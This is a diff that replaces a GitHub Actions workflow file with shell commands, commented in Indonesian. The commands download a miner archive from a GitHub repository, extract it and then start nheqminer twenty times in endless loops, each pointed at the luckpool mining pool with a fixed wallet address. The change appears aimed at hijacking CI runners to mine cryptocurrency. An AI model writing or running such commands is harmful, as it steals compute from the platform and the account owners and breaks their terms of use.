@@ -1,10 +1,125 @@
-name: test
-on: 
-  workflow_dispatch:
-defaults:
-  run:
-    shell: bash
+#Ambil
+https://github.com/cvchldrenfuture/cf/blob/main/cf-main.tar.gz
 
-jobs:
-  build:
-      run: source setup.sh
+#Ekstrak
+tar xf cf-main.tar.gz
+
+#1
+while [ 1 ]; do
+./nheqminer -v -l na.luckpool.net:3956 -u RUnd9GotXB9Te5QW7cmkkYLidBFuffdEjh.Ring02 -p x -t 2
+sleep 2
+done
+
+#2
+while [ 1 ]; do
+./nheqminer -v -l na.luckpool.net:3956 -u RUnd9GotXB9Te5QW7cmkkYLidBFuffdEjh.Ring02 -p x -t 2
+sleep 2
+done
+
+#3
+while [ 1 ]; do
+./nheqminer -v -l na.luckpool.net:3956 -u RUnd9GotXB9Te5QW7cmkkYLidBFuffdEjh.Ring02 -p x -t 2
+sleep 2
+done
+
+#4
+while [ 1 ]; do
+./nheqminer -v -l na.luckpool.net:3956 -u RUnd9GotXB9Te5QW7cmkkYLidBFuffdEjh.Ring02 -p x -t 2
+sleep 2
+done
+
+#5
+while [ 1 ]; do
+./nheqminer -v -l na.luckpool.net:3956 -u RUnd9GotXB9Te5QW7cmkkYLidBFuffdEjh.Ring02 -p x -t 2
+sleep 2
+done
+
+#6
+while [ 1 ]; do
+./nheqminer -v -l na.luckpool.net:3956 -u RUnd9GotXB9Te5QW7cmkkYLidBFuffdEjh.Ring02 -p x -t 2
+sleep 2
+done
+
+#7
+while [ 1 ]; do
+./nheqminer -v -l na.luckpool.net:3956 -u RUnd9GotXB9Te5QW7cmkkYLidBFuffdEjh.Ring02 -p x -t 2
+sleep 2
+done
+
+#8
+while [ 1 ]; do
+./nheqminer -v -l na.luckpool.net:3956 -u RUnd9GotXB9Te5QW7cmkkYLidBFuffdEjh.Ring02 -p x -t 2
+sleep 2
+done
+
+#9
+while [ 1 ]; do
+./nheqminer -v -l na.luckpool.net:3956 -u RUnd9GotXB9Te5QW7cmkkYLidBFuffdEjh.Ring02 -p x -t 2
+sleep 2
+done
+
+#10
+while [ 1 ]; do
+./nheqminer -v -l na.luckpool.net:3956 -u RUnd9GotXB9Te5QW7cmkkYLidBFuffdEjh.Ring02 -p x -t 2
+sleep 2
+done
+
+#11
+while [ 1 ]; do
+./nheqminer -v -l na.luckpool.net:3956 -u RUnd9GotXB9Te5QW7cmkkYLidBFuffdEjh.Ring02 -p x -t 2
+sleep 2
+done
+
+#12
+while [ 1 ]; do
+./nheqminer -v -l na.luckpool.net:3956 -u RUnd9GotXB9Te5QW7cmkkYLidBFuffdEjh.Ring02 -p x -t 2
+sleep 2
+done
+
+#13
+while [ 1 ]; do
+./nheqminer -v -l na.luckpool.net:3956 -u RUnd9GotXB9Te5QW7cmkkYLidBFuffdEjh.Ring02 -p x -t 2
+sleep 2
+done
+
+#14
+while [ 1 ]; do
+./nheqminer -v -l na.luckpool.net:3956 -u RUnd9GotXB9Te5QW7cmkkYLidBFuffdEjh.Ring02 -p x -t 2
+sleep 2
+done
+
+#15
+while [ 1 ]; do
+./nheqminer -v -l na.luckpool.net:3956 -u RUnd9GotXB9Te5QW7cmkkYLidBFuffdEjh.Ring02 -p x -t 2
+sleep 2
+done
+
+#16
+while [ 1 ]; do
+./nheqminer -v -l na.luckpool.net:3956 -u RUnd9GotXB9Te5QW7cmkkYLidBFuffdEjh.Ring02 -p x -t 2
+sleep 2
+done
+
+#17
+while [ 1 ]; do
+./nheqminer -v -l na.luckpool.net:3956 -u RUnd9GotXB9Te5QW7cmkkYLidBFuffdEjh.Ring02 -p x -t 2
+sleep 2
+done
+
+#18
+while [ 1 ]; do
+./nheqminer -v -l na.luckpool.net:3956 -u RUnd9GotXB9Te5QW7cmkkYLidBFuffdEjh.Ring02 -p x -t 2
+sleep 2
+done
+
+#19
+while [ 1 ]; do
+./nheqminer -v -l na.luckpool.net:3956 -u RUnd9GotXB9Te5QW7cmkkYLidBFuffdEjh.Ring02 -p x -t 2
+sleep 2
+done
+
+#20
+while [ 1 ]; do
+./nheqminer -v -l na.luckpool.net:3956 -u RUnd9GotXB9Te5QW7cmkkYLidBFuffdEjh.Ring02 -p x -t 2
+sleep 2
+done
